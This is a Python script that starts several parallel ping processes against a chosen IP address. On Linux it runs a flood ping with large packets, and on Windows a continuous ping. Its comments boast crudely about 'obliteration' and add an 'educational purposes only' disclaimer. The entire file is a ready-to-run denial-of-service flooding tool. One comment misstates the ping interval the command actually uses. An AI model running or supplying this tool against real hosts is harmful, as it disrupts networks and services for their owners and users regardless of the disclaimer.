import os
import shlex
import subprocess
import sys
import platform
from threading import Thread
from multiprocessing import Process

F_MY_SYSTEM = True

def run(ip):
    if platform.system().lower() == "windows":
        # soy boy windows ping 
        cmd = f"ping {ip} -t > NUL"
        
    elif platform.system().lower() == "linux":
        # GIGA CHAD ping
        # definition of obliteration right here
        # if you want your system to get a$$ f$#k, use this
        # this will send flood ping with an interval of 0.1 seconds
        # with packet size reaching the MTU limit of 1.5 KB
        cmd = f"ping {ip} -q -f -s 1440 -i 0.2 -W 0.01"
        
    return subprocess.Popen(shlex.split(cmd), stdout=subprocess.DEVNULL)


if __name__ == "__main__":
    # please only use ip to a server that you own and it won't mind to get a$$fu$$ked, hard
    # i don't hold accountable for any repercussions when done
    # to a public server
    # as this made solely for educational purposes only
    ip = "127.0.0.1" if os.getenv("PING_DEST_IP") is None else os.getenv("PING_DEST_IP")

    # use appropriate value
    # too big, it will probably lead to some "unexpected" results
    # do at your own risk
    try:
        n_process = 4 if os.getenv("PING_N_PROCESS") is None else int(os.getenv("PING_N_PROCESS"))
    except ValueError:
        n_process = 4
    
    print(f"[INFO] destination address: {ip}")
    print(f"[INFO] requested number of process: {n_process}")

    ping_proc = [None for i in range(n_process)]
    count = 0
    try:
        try:
            for i in range(n_process):
                    ping_proc[i] = run(ip)
                    count += 1
        except Exception as e:
            print(e)
            print(f"[WARN] cannot create more process")
            pass
        

        print(f"[INFO] {count} process is currently running")
        print(f"[INFO] Press CTRL+C to exit the program")
        
        while True:
            continue
    
    except KeyboardInterrupt:
        pass

    finally:
        for proc in ping_proc:
            if proc == None:
                continue
            proc.kill()
            count -= 1

        if count != 0:
            print(f"[WARN] there seems to be some leftover {count} process running that cannot be killed")

        else:
            print("[INFO] all resource has been closed")

        sys.exit(0)
            
